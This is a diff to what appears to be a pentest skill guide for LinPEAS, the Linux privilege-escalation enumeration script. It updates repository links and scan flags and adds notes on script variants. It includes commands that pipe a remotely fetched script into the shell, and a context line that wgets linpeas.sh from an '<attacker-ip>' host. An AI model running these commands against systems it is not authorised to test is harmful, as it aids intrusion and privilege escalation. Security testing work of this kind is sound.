@@ -19,7 +19,7 @@ dependencies:
   tools: [curl, bash, python3]
   optional: [wget]
 references:
-  - https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+  - https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
   - https://book.hacktricks.xyz/linux-hardening/privilege-escalation
   - https://attack.mitre.org/tactics/TA0004/
   - https://attack.mitre.org/tactics/TA0007/
@@ -37,16 +37,21 @@ LinPEAS (Linux Privilege Escalation Awesome Script) is the most comprehensive au
 
 ```bash
 # Download and run LinPEAS directly (no-install, in-memory)
-curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 
 # Save output for analysis
-curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh
 chmod +x /tmp/linpeas.sh
 /tmp/linpeas.sh -a 2>&1 | tee /tmp/linpeas_output.txt
 
-# Quick scan (faster, fewer checks)
-/tmp/linpeas.sh -q 2>&1 | tee /tmp/linpeas_quick.txt
+# Stealth / faster scan (skips time-consuming checks)
+/tmp/linpeas.sh -s 2>&1 | tee /tmp/linpeas_fast.txt
 ```
+
+**Script variants** (choose based on environment):
+- `linpeas.sh` — default, includes linux exploit suggester
+- `linpeas_fat.sh` — embeds third-party tools (no internet needed on target)
+- `linpeas_small.sh` — essential checks only, smallest footprint
 
 Use `scripts/linpeas_runner.py` for structured JSON output and automated triage.
 
@@ -224,7 +229,7 @@ wget http://<attacker-ip>:8080/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh &
 
 ## References
 
-- [LinPEAS GitHub](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
+- [LinPEAS GitHub](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
 - [HackTricks Linux Privesc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
 - [GTFOBins](https://gtfobins.github.io/)
 - [MITRE ATT&CK TA0004 Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)
